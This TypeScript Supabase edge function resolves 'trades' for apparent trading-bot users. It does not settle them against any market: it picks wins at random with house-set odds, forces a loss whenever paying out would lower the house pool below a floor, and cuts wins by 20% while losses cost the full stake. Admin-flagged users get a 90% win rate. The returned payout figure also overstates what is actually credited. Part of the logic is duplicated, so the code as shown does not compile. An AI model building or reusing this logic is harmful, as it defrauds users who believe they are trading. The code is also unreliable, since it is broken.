// Server-side trade resolution. Guarantees the house never goes into loss
// while honoring per-user win tiers and per-bot risk tiers.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};
const json = (data: unknown, status = 200) =>
  new Response(JSON.stringify(data), { status, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });

// Base win probabilities by bot risk tier (house edge built in)
const BASE_WIN_PROB: Record<string, number> = {
  low: 0.62,     // safer bot → user wins more often, smaller payouts assumed
  normal: 0.48,  // slight house edge
  high: 0.32,    // high-risk / high-reward → house edge larger
};
const HIGH_TIER_WIN_PROB = 0.90; // admin-flagged "high win" users
// Losses always cost full stake; wins are shrunk by this factor so that the
// magnitude of a loss exceeds the magnitude of a win even when users win often.
// Effective profit = stake * (payout_mult - 1) * WIN_SHRINK
const WIN_SHRINK = 0.80;

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!,
    );

    const body = await req.json().catch(() => ({}));
    const { deriv_account, email, bot_id, stake, payout_multiplier } = body || {};
    const stakeN = Number(stake);
    const payoutMult = Number(payout_multiplier);
    if (!deriv_account || !(stakeN > 0) || !(payoutMult > 1))
      return json({ error: 'deriv_account, stake>0, payout_multiplier>1 required' }, 400);

    // Load user tier (by email if provided, fallback by deriv_account=email pattern)
    let winTier = 'normal';
    const idLookup = email || deriv_account;
    if (idLookup) {
      const { data: u } = await supabase.from('app_users')
        .select('win_tier').eq('email', idLookup).maybeSingle();
      if (u?.win_tier) winTier = u.win_tier;
    }

    // Load bot risk tier
    let riskTier = 'normal';
    if (bot_id) {
      const { data: b } = await supabase.from('bots')
        .select('risk_tier').eq('id', bot_id).maybeSingle();
      if (b?.risk_tier) riskTier = b.risk_tier;
    }

    // Compute target win probability
    let p = BASE_WIN_PROB[riskTier] ?? BASE_WIN_PROB.normal;
    if (winTier === 'high') p = HIGH_TIER_WIN_PROB;

    // Load house ledger (single row)
    const { data: ledger } = await supabase.from('house_ledger')
      .select('*').limit(1).maybeSingle();
    const pool = Number(ledger?.pool || 0);
    const minFloor = Number(ledger?.min_floor || 0);
    const rawPayoutProfit = stakeN * (payoutMult - 1);
    const winProfit = +(rawPayoutProfit * WIN_SHRINK).toFixed(2); // shrunk win
    const potentialLoss = winProfit; // house pays this if user wins

    // HOUSE SAFETY: if paying out this win would push pool below floor → force loss.
    const safeFloor = winTier === 'high' ? minFloor / 2 : minFloor;
    const canAfford = (pool - potentialLoss) >= safeFloor;
    let won: boolean;
    if (!canAfford) {
      won = false;
    } else {
      won = Math.random() < p;
    }

    const profit = won ? winProfit : -stakeN;
    const canAfford = (pool - potentialLoss) >= safeFloor;
    let won: boolean;
    if (!canAfford) {
      won = false; // house always wins when it can't afford the payout
    } else {
      won = Math.random() < p;
    }

    const profit = won ? potentialLoss : -stakeN;
    // House pool moves inversely: stake in → +stake; win paid → -profit
    const housePoolDelta = won ? -potentialLoss : stakeN;

    // Update ledger atomically-ish
    if (ledger?.id) {
      await supabase.from('house_ledger').update({
        pool: +(pool + housePoolDelta).toFixed(2),
        total_user_stakes: +(Number(ledger.total_user_stakes || 0) + stakeN).toFixed(2),
        total_user_payouts: +(Number(ledger.total_user_payouts || 0) + (won ? potentialLoss + stakeN : 0)).toFixed(2),
        updated_at: new Date().toISOString(),
      }).eq('id', ledger.id);
    } else {
      await supabase.from('house_ledger').insert({
        pool: housePoolDelta,
        total_user_stakes: stakeN,
        total_user_payouts: won ? potentialLoss + stakeN : 0,
      });
    }

    return json({
      success: true,
      won,
      profit,
      payout: won ? +(stakeN * payoutMult).toFixed(2) : 0,
      win_tier: winTier,
      risk_tier: riskTier,
      house_safe: canAfford,
    });
  } catch (e) {
    console.error('resolve-trade error', e);
    return json({ error: (e as Error).message }, 500);
  }
});
